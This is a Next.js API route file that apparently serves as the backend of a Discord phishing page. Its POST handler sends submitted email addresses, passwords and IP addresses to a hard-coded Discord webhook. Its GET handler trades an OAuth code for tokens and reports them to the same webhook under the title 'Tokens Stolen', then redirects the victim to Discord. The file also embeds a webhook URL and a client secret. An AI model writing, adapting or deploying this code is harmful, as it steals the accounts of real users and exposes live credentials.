import { NextRequest, NextResponse } from 'next/server';

const WEBHOOK = 'https://discord.com/api/webhooks/1479843046223909040/kGSLiyRPqh9TqsZfhRqMqc0fHdF05ZasD7DQNMHGT4Y7Su3yrCTU7N1Y_QhdZwgie614';

async function sendToWebhook(title: string, fields: { name: string; value: string }[]) {
  await fetch(WEBHOOK, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      embeds: [{
        title,
        color: 0x5865F2,
        fields,
        timestamp: new Date().toISOString()
      }]
    })
  }).catch(() => {});
}

export async function POST(req: NextRequest) {
  try {
    const body = await req.json();
    if (body.type !== 'creds') return NextResponse.json({});

    await sendToWebhook('New Login', [
      { name: 'Email', value: body.email || '—' },
      { name: 'Password', value: body.password || '—' },
      { name: 'IP', value: req.headers.get('x-forwarded-for') || 'unknown' }
    ]);

    return NextResponse.json({ ok: true });
  } catch {
    return NextResponse.json({});
  }
}

export async function GET(req: NextRequest) {
  const code = new URL(req.url).searchParams.get('code');
  if (!code) return NextResponse.redirect('https://discord.com/login');

  try {
    const tokenRes = await fetch('https://discord.com/api/oauth2/token', {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: new URLSearchParams({
        client_id: '1479876735242731571',
        client_secret: 'RXyw76HLE-f4SQoHDd4Y7ctzwsHfojdh',
        grant_type: 'authorization_code',
        code,
        redirect_uri: 'https://sya-production.up.railway.app/api/auth'
      }).toString()
    });

    if (!tokenRes.ok) throw new Error('Token exchange failed');

    const tokens = await tokenRes.json();

    await sendToWebhook('Tokens Stolen', [
      { name: 'Access Token', value: tokens.access_token?.slice(0, 12) + '...' || '—' },
      { name: 'Refresh Token', value: tokens.refresh_token?.slice(0, 12) + '...' || 'none' },
      { name: 'Expires In', value: tokens.expires_in?.toString() || '—' }
    ]);

    return NextResponse.redirect('https://discord.com/app');
  } catch (err) {
    console.error(err);
    return NextResponse.redirect('https://discord.com/login');
  }
}
